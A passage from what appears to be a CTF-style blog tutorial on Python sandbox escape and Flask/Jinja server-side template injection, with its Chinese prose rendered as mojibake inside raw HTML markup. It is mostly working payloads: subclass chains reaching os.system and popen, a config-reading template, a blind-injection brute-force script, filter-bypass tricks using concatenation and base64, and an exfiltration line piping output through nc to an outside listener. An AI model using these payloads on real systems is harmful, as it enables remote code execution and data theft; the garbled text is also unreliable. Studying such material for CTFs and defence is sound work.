class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;sys.getwindowsversion&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;nt.stat_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;nt.statvfs_result&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteCodec&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteIncrementalEncoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteIncrementalDecoder&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteStreamReader&#x27;</span>&gt;, &lt;<span class="hljs-keyword">type</span> <span class="hljs-string">&#x27;MultibyteStreamWriter&#x27;</span>&gt;]</code></pre><p>è¿™æ ·ä¸å¥½æŸ¥çœ‹ï¼Œæšä¸¾ä¸€ä¸‹ï¼š</p><p><img src="/2021/04/06/wei4/1.png" alt="1"></p><h3 id="æ²™ç›’é€ƒé€¸åŸç†"><a class="header-anchor" href="#æ²™ç›’é€ƒé€¸åŸç†">ğŸ­</a>æ²™ç›’é€ƒé€¸åŸç†</h3><p><strong>æ²™ç›’/æ²™ç®±</strong></p><p>æ²™ç®±åœ¨æ—©æœŸä¸»è¦ç”¨äºæµ‹è¯•å¯ç–‘è½¯ä»¶ï¼Œæµ‹è¯•ç—…æ¯’å±å®³ç¨‹åº¦ç­‰ç­‰ã€‚åœ¨æ²™ç®±ä¸­è¿è¡Œï¼Œå³ä½¿ç—…æ¯’å¯¹å…¶é€ æˆäº†ä¸¥é‡å±å®³ï¼Œä¹Ÿä¸ä¼šå¨èƒåˆ°çœŸå®ç¯å¢ƒï¼Œæ²™ç®±é‡æ„ä¹Ÿååˆ†ä¾¿æ·ã€‚æœ‰ç‚¹ç±»ä¼¼è™šæ‹Ÿæœºçš„åˆ©ç”¨ã€‚</p><p>æ²™ç®±é€ƒé€¸,å°±æ˜¯åœ¨ç»™æˆ‘ä»¬çš„ä¸€ä¸ªä»£ç æ‰§è¡Œç¯å¢ƒä¸‹,è„±ç¦»ç§ç§è¿‡æ»¤å’Œé™åˆ¶,æœ€ç»ˆæˆåŠŸæ‹¿åˆ°shellæƒé™çš„è¿‡ç¨‹ã€‚å…¶å®å°±æ˜¯é—¯è¿‡é‡é‡é»‘åå•ï¼Œæœ€ç»ˆæ‹¿åˆ°ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œæƒé™çš„è¿‡ç¨‹</p><p>pythonç±»ç»§æ‰¿ï¼š</p><pre><code class="hljs awk">__base__ <span class="hljs-regexp">//</span>å¯¹è±¡çš„ä¸€ä¸ªåŸºç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯objectï¼Œæœ‰æ—¶ä¸æ˜¯ï¼Œè¿™æ—¶éœ€è¦ä½¿ç”¨ä¸‹ä¸€ä¸ªæ–¹æ³•__mro__ <span class="hljs-regexp">//</span>åŒæ ·å¯ä»¥è·å–å¯¹è±¡çš„åŸºç±»ï¼Œåªæ˜¯è¿™æ—¶ä¼šæ˜¾ç¤ºå‡ºæ•´ä¸ªç»§æ‰¿é“¾çš„å…³ç³»ï¼Œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œobjectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡__mro__[-<span class="hljs-number">1</span>]å¯ä»¥è·å–åˆ°__subclasses__() <span class="hljs-regexp">//</span>ç»§æ‰¿æ­¤å¯¹è±¡çš„å­ç±»ï¼Œè¿”å›ä¸€ä¸ªåˆ—è¡¨</code></pre><p>å¯ä»¥ä»ä»»ä½•ä¸€ä¸ªå˜é‡ï¼Œå›æº¯åˆ°åŸºç±»ä¸­å»ï¼Œå†è·å¾—åˆ°æ­¤åŸºç±»æ‰€æœ‰å®ç°çš„ç±»ï¼Œå°±å¯ä»¥è·å¾—åˆ°å¾ˆå¤šçš„ç±»ã€‚</p><h3 id="payload"><a class="header-anchor" href="#payload">ğŸ­</a>payload</h3><h4 id="python2"><a class="header-anchor" href="#python2">ğŸ­</a>python2</h4><p>æƒ³è¦ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„payloadåªéœ€è¦æœ‰osæ¨¡å—æ‰§è¡Œos.systemå³å¯ï¼š</p><pre><code class="hljs livecodeserver"><span class="hljs-built_in">num</span> = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> <span class="hljs-keyword">item</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__():    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">item</span>.__init__.__globals__:            print <span class="hljs-built_in">num</span>,<span class="hljs-keyword">item</span>        <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span>    except:        <span class="hljs-built_in">num</span>+=<span class="hljs-number">1</span><span class="hljs-comment">#72 &lt;class &#x27;site._Printer&#x27;&gt;</span><span class="hljs-comment">#77 &lt;class &#x27;site.Quitter&#x27;&gt;</span></code></pre><p>payloadï¼š</p><pre><code class="hljs sqf"><span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls&#x27;</span>).read()</code></pre><p>osæ¨¡å—è¿˜æœ‰ä»<code>warnings.catch*warnings</code>æ¨¡å—å…¥æ‰‹çš„ï¼Œè€Œè¿™ä¸¤ä¸ªæ¨¡å—åˆ†åˆ«ä½äºå…ƒç»„ä¸­çš„59ï¼Œ60å·å…ƒç´ ã€‚<code>__init__</code>æ–¹æ³•ç”¨äºå°†å¯¹è±¡å®ä¾‹åŒ–ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>func\*globals</code>ï¼ˆæˆ–è€…<code>__globals**</code>ï¼‰çœ‹è¯¥æ¨¡å—ä¸‹æœ‰å“ªäº›globalså‡½æ•°ï¼ˆæ³¨æ„è¿”å›çš„æ˜¯å­—å…¸ï¼‰ï¼Œè€Œlinecacheå¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°å¼•ç”¨äº†osæ¨¡å—ã€‚äºæ˜¯è¿˜å¯ä»¥æŒ–æ˜åˆ°ç±»ä¼¼payload:</p><pre><code class="hljs sqf">[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)[].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.func_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>.values()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;ls&#x27;</span>)</code></pre><h4 id="python3"><a class="header-anchor" href="#python3">ğŸ­</a>python3</h4><p>python2ä¸‹æœ‰fileè€Œåœ¨python3ä¸‹å·²ç»æ²¡æœ‰äº†ï¼Œæ‰€ä»¥æ˜¯ç›´æ¥ç”¨openã€‚python3çš„åˆ©ç”¨ä¸»è¦ç´¢å¼•åœ¨äº<code>__builtins__</code>ï¼Œæ‰¾åˆ°äº†å®ƒæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å…¶ä¸­çš„evalã€openç­‰ç­‰æ¥æ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„æ“ä½œ,å¤§ä½¬æ”¹ç¼–çš„ä¸€ä¸ªé€’å½’è„šæœ¬ï¼š</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">obj, max_depth</span>):</span>    visited_clss = []    visited_objs = []    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit</span>(<span class="hljs-params">obj, path=<span class="hljs-string">&#x27;obj&#x27;</span>, depth=<span class="hljs-number">0</span></span>):</span>        <span class="hljs-keyword">yield</span> path, obj        <span class="hljs-keyword">if</span> depth == max_depth:            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">elif</span> isinstance(obj, (int, float, bool, str, bytes)):            <span class="hljs-keyword">return</span>        <span class="hljs-keyword">elif</span> isinstance(obj, type):            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_clss:                <span class="hljs-keyword">return</span>            visited_clss.append(obj)            <span class="hljs-comment">#print(obj) Enumerates the objects traversed</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> visited_objs:                <span class="hljs-keyword">return</span>            visited_objs.append(obj)        <span class="hljs-comment"># attributes</span>        <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> dir(obj):            <span class="hljs-keyword">try</span>:                attr = getattr(obj, name)            <span class="hljs-keyword">except</span>:                <span class="hljs-keyword">continue</span>            <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(attr, <span class="hljs-string">&#x27;&#123;&#125;.&#123;&#125;&#x27;</span>.format(path, name), depth + <span class="hljs-number">1</span>)        <span class="hljs-comment"># dict values</span>        <span class="hljs-keyword">if</span> hasattr(obj, <span class="hljs-string">&#x27;items&#x27;</span>) <span class="hljs-keyword">and</span> callable(obj.items):            <span class="hljs-keyword">try</span>:                <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> obj.items():                    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">&#x27;&#123;&#125;[&#123;&#125;]&#x27;</span>.format(path, repr(k)), depth)            <span class="hljs-keyword">except</span>:                <span class="hljs-keyword">pass</span>        <span class="hljs-comment"># items</span>        <span class="hljs-keyword">elif</span> isinstance(obj, (set, list, tuple, frozenset)):            <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> enumerate(obj):                <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(v, <span class="hljs-string">&#x27;&#123;&#125;[&#123;&#125;]&#x27;</span>.format(path, repr(i)), depth)    <span class="hljs-keyword">yield</span> <span class="hljs-keyword">from</span> visit(obj)num = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">-1</span>].__subclasses__():    <span class="hljs-keyword">try</span>:        <span class="hljs-keyword">if</span> item.__init__.__globals__.keys():            <span class="hljs-keyword">for</span> path, obj <span class="hljs-keyword">in</span> search(item,<span class="hljs-number">5</span>):                <span class="hljs-keyword">if</span> obj <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;__builtins__&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>):                    print(<span class="hljs-string">&#x27;[+] &#x27;</span>,item,num,path)        num+=<span class="hljs-number">1</span>    <span class="hljs-keyword">except</span>:        num+=<span class="hljs-number">1</span></code></pre><p>å¦å¤–pyhonæ‰§è¡Œå‘½ä»¤çš„æ–¹å¼è¿˜æœ‰subprocessã€commandç­‰ç­‰ï¼Œæ§åˆ¶é€’å½’æ·±åº¦ï¼Œå¯ä»¥æŒ–æ˜åˆ°æ›´å¤špayloadã€‚</p><h4 id="å¸¸ç”¨payload"><a class="header-anchor" href="#å¸¸ç”¨payload">ğŸ­</a>å¸¸ç”¨payload</h4><h6 id="è·å–åŸºæœ¬ç±»"><a class="header-anchor" href="#è·å–åŸºæœ¬ç±»">ğŸ­</a>è·å–åŸºæœ¬ç±»</h6><p><code>â€˜â€˜.__class__.__mro__[2]</code></p><p><code>&#123;&#125;.__class__.__bases__[0]</code></p><p><code>().__class__.__bases__[0]</code></p><p><code>[].__class__.__bases__[0]</code></p><p><code>request.__class__.__mro__[8]</code></p><h6 id="æŸ¥çœ‹è®¾ç½®ä¸­çš„å˜é‡"><a class="header-anchor" href="#æŸ¥çœ‹è®¾ç½®ä¸­çš„å˜é‡">ğŸ­</a>æŸ¥çœ‹è®¾ç½®ä¸­çš„å˜é‡</h6><p><code>&#123;  &#123; config &#125;  &#125;</code></p><p><code>&#123; &#123; url_for.__globals__[â€˜current_appâ€˜].config[â€˜flagâ€˜] &#125; &#125;</code></p><p><code>&#123; &#123; get_flashed_messages.__globals__[â€˜current_appâ€˜].config[â€˜flagâ€˜] &#125; &#125;</code></p><h6 id="æŸ¥çœ‹æ¨¡æ¿ä¸­çš„å˜é‡-å†…å®¹"><a class="header-anchor" href="#æŸ¥çœ‹æ¨¡æ¿ä¸­çš„å˜é‡-å†…å®¹">ğŸ­</a>æŸ¥çœ‹æ¨¡æ¿ä¸­çš„å˜é‡/å†…å®¹</h6><p><code>&#123; &#123; self.__dict__ &#125; &#125;</code></p><h6 id="æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶"><a class="header-anchor" href="#æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶">ğŸ­</a>æŸ¥çœ‹æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶</h6><p><code>&#123; &#123;â€˜â€˜.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[â€˜osâ€˜].listdir(â€˜./â€˜)&#125; &#125;</code></p><h6 id="æ–‡ä»¶è¯»å–"><a class="header-anchor" href="#æ–‡ä»¶è¯»å–">ğŸ­</a>æ–‡ä»¶è¯»å–</h6><p><code>â€˜â€˜.__class__.__mro__[-1].__subclasses__()[40](â€˜filenameâ€˜).read()</code></p><p>æ‰§è¡Œå‘½ä»¤ <code>â€˜â€˜.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(â€˜lsâ€˜).read()</code></p><h3 id="æ— å›æ˜¾å¤„ç†"><a class="header-anchor" href="#æ— å›æ˜¾å¤„ç†">ğŸ­</a>æ— å›æ˜¾å¤„ç†</h3><blockquote><p>ncè½¬å‘</p><blockquote><pre><code class="hljs sqf">&gt;&gt;vpsï¼šnc -lvp <span class="hljs-number">44444</span>&gt;&gt;payload: <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;ls | nc xx.xxx.xx.xx 44444&#x27;</span>)</code></pre><p>ä¹Ÿå¯ä»¥è€ƒè™‘ç›´æ¥åå¼¹äº¤äº’å‹shell</p></blockquote></blockquote><blockquote><p>dnslogè½¬å‘</p><blockquote><pre><code class="hljs autohotkey">&gt;curl `whoami`.xxxxxx</code></pre><p>å‚è€ƒ<a href="http://www.smartredirect.de/redir/clickGate.php?u=IgKHHLBT&amp;m=1&amp;p=8vZ5ugFkSx&amp;t=vHbSdnLT&amp;st=&amp;s=&amp;url=https%3A%2F%2Fwww.cnblogs.com%2Fafanti%2Fp%2F8047530.html&amp;r=https%3A%2F%2Fwww.anquanke.com%2Fpost%2Fid%2F188172%23h3-10">å·§ç”¨DNSlogå®ç°æ— å›æ˜¾æ³¨å…¥</a><br>å»ºç«‹æœ¬åœ°æ–‡ä»¶å†è¯»å–<br>è¿™ä¸ªä¹Ÿå¾ˆå¥½ç†è§£ï¼Œé’ˆå¯¹systemæ— å›æ˜¾ï¼Œç›´æ¥æ‰§è¡Œ<code>ls &gt; a.txt</code>ï¼Œå†ç”¨openè¿›è¡Œè¯»å–</p></blockquote></blockquote><blockquote><p>curlä¸Šä¼ æ–‡ä»¶</p><blockquote><p>å‚è€ƒï¼š<a href="http://admintony.com/%E6%97%A0%E5%9B%9E%E6%98%BE%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95.html">æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•</a></p></blockquote></blockquote><blockquote><p>ç›²æ³¨<code>&#123; % if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' % &#125;~p0~&#123; % endif % &#125;</code>ç±»ä¼¼SQLå¸ƒå°”æ³¨å…¥ï¼Œé€šè¿‡æ˜¯å¦å›æ˜¾<sub>p0</sub>æ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸã€‚æ‰¾åˆ°è„šæœ¬å¦‚ä¸‹ï¼š</p><blockquote><pre><code class="hljs markdown">&gt;import requests&gt;url = &#x27;http://127.0.0.1:8080/&#x27;&gt;def check(payload):&gt;postdata = &#123;  &#x27;exploit&#x27;:payload  &#125;&gt;r = requests.post(url, data=postdata).content&gt;return &#x27;~p0~&#x27; in r&gt;password  = &#x27;&#x27;&gt;s = r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$&#x27;()<span class="hljs-emphasis">*+,-./:;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">=</span>&gt;</span></span>?@[\]^`&#123;|&#125;~&#x27;&quot;_%&#x27;</span><span class="hljs-emphasis"></span><span class="hljs-emphasis">&gt;for i in xrange(0,100):</span><span class="hljs-emphasis">&gt;for c in s:</span><span class="hljs-emphasis">  payload = &#x27;&#123; % if &quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">2</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&quot;/tmp/test&quot;</span>).read()[&#x27;+str(i)+&#x27;:&#x27;+str(i+1)+&#x27;] == &quot;&#x27;+c+&#x27;&quot; % &#125;~p0~&#123; % endif % &#125;&#x27;</span><span class="hljs-emphasis">  if check(payload):</span><span class="hljs-emphasis">      password += c</span><span class="hljs-emphasis">      break</span><span class="hljs-emphasis">&gt;print password</span></code></pre></blockquote></blockquote><h3 id="SSTIæ§åˆ¶è¯­å¥"><a class="header-anchor" href="#SSTIæ§åˆ¶è¯­å¥">ğŸ­</a>SSTIæ§åˆ¶è¯­å¥</h3><p>åšé¢˜çš„æ—¶å€™é‡åˆ°SSTIï¼Œæˆ‘ä»¬è¦çŸ¥é“ä¸€ä¸ªpython-webæ¡†æ¶ä¸­å“ªäº›payloadå¯ç”¨ï¼Œä¸€ä¸ªä¸€ä¸ªå‘è¯·æ±‚æ‰‹åŠ¨æµ‹è¯•å°±å¤ªæ…¢ï¼Œè¿™é‡Œå°±éœ€è¦ç”¨æ¨¡æ¿çš„æ§åˆ¶è¯­å¥æ¥å†™ä»£ç æ“ä½œã€‚</p><pre><code class="hljs clojure">&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__ == &#x27;catch_warnings&#x27; % &#125;  &#123; % for b in c.__init__.__globals__.values() % &#125;  &#123; % if b.__class__ == &#123;&#125;.__class__ % &#125;    &#123; % if &#x27;eval&#x27; in b.keys() % &#125;      &#123; &#123; b[&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;id&quot;</span>).read()&#x27;) &#125; &#125;    &#123; % endif % &#125;  &#123; % endif % &#125;  &#123; % endfor % &#125;&#123; % endif % &#125;&#123; % endfor % &#125;</code></pre><p>æ ¹æ®å®é™…æƒ…å†µæ›´æ”¹ä»£ç ç›´æ¥å¯¹é¢˜ç›®ç¯å¢ƒæµ‹è¯•</p><h3 id="Bypass"><a class="header-anchor" href="#Bypass">ğŸ­</a>Bypass</h3><h5 id="æ‹¼æ¥"><a class="header-anchor" href="#æ‹¼æ¥">ğŸ­</a>æ‹¼æ¥</h5><pre><code class="hljs markdown">object.<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.func<span class="hljs-emphasis">_globals[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-strong">__dict__</span>[<span class="hljs-string">&#x27;o&#x27;+&#x27;s&#x27;</span>].<span class="hljs-strong">__dict__</span>[<span class="hljs-string">&#x27;sy&#x27;+&#x27;stem&#x27;</span>](<span class="hljs-link">&#x27;ls&#x27;</span>)</span><span class="hljs-emphasis">().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">40</span>](<span class="hljs-link">&#x27;r&#x27;,&#x27;fla&#x27;+&#x27;g.txt&#x27;</span>)).read()</span></code></pre><h5 id="ç¼–ç "><a class="header-anchor" href="#ç¼–ç ">ğŸ­</a>ç¼–ç </h5><pre><code class="hljs markdown">().<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">59</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>[<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-link">&quot;__import__(&#x27;os&#x27;</span>).popen(&#x27;ls&#x27;).read()&quot;)</code></pre><p>ç­‰ä»·äº</p><p><code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['ZXZhbA=='.decode('base64')](&quot;X19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMnKS5yZWFkKCk=&quot;.decode('base64'))</code>(å¯ä»¥çœ‹å‡ºå•åŒå¼•å·å†…çš„éƒ½å¯ä»¥ç¼–ç )</p><p>åŒç†è¿˜å¯ä»¥è¿›è¡Œrot13ã€16è¿›åˆ¶ç¼–ç ç­‰</p><h5 id="è¿‡æ»¤class"><a class="header-anchor" href="#è¿‡æ»¤class">ğŸ­</a>è¿‡æ»¤class</h5><p>ä½¿ç”¨session</p><pre><code class="hljs prolog">poc &#123; &#123;session[<span class="hljs-string">&#x27;__cla&#x27;</span>+<span class="hljs-string">&#x27;ss__&#x27;</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">118</span>]&#125; &#125;</code></pre><p>å¤šä¸ªbases[0]æ˜¯å› ä¸ºä¸€ç›´åœ¨å‘ä¸Šæ‰¾objectç±»ã€‚ä½¿ç”¨mroå°±ä¼šå¾ˆæ–¹ä¾¿</p><pre><code class="hljs clojure">&#123; &#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[<span class="hljs-number">12</span>]&#125; &#125;</code></pre><p>æˆ–è€…</p><pre><code class="hljs clojure">&#123; &#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[<span class="hljs-number">12</span>]&#125; &#125;</code></pre><h5 id="è¿‡æ»¤ä¸­æ‹¬å·"><a class="header-anchor" href="#è¿‡æ»¤ä¸­æ‹¬å·">ğŸ­</a>è¿‡æ»¤ä¸­æ‹¬å·[]</h5><p><strong>getitem()</strong></p><pre><code class="hljs python"><span 